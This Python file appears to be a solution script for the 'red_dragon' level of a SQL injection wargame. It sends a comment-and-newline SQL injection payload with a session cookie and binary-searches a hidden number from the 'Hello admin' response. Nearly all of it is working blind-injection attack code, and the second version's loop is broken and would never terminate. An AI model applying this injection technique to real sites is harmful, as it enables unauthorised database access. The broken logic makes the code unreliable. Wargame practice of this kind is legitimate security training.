""" import requests

MIN = 100000000
MAX = 1000000000

URL = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"
COOKIE = "mcmgkg6nanrgce9bn43o2nhds3"

def binary_search(start, end):
    if start == end:
        print("==> " + str(start + 1))
        exit()

    mid = (start + end) // 2
    data = make_request(mid)

    if "Hello admin" in data:
        start = mid + 1
    else:
        end = mid - 1

    binary_search(start, end)

def make_request(no):
    payload = "?id='||no>%23&no=%0A{}".format(no)

    print("Trying {}...".format(no))
    response = requests.get(URL + payload, headers={"Cookie": COOKIE})

    return response.text

binary_search(MIN, MAX) """


import requests

URL = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php/?id='||no>%23&no=%0a";
auth = {"PHPSESSID":"mcmgkg6nanrgce9bn43o2nhds3"};

MAX = 1000000000
MIN = 100000000

#Find the number: Implementing linear search would take a long time hence we're using binary search here.
def main():
    print("Brute Forcing the Number");
    left = MIN;
    right = MAX;
    while(left<right):
        center = (left+right)//2;
    r = requests.get(URL+str(center),cookies=auth);
    if "Hello admin" in r.text:
        print("Found it n: "+str(center));
    requests.get(URL+str(center-1),cookies=auth);
    if "Hello admin" in r.text:
        print("Found it n: "+str(center));
    #r = requests.get(URL+str(center),cookies=auth);
    


if __name__ == "__main__":
    main();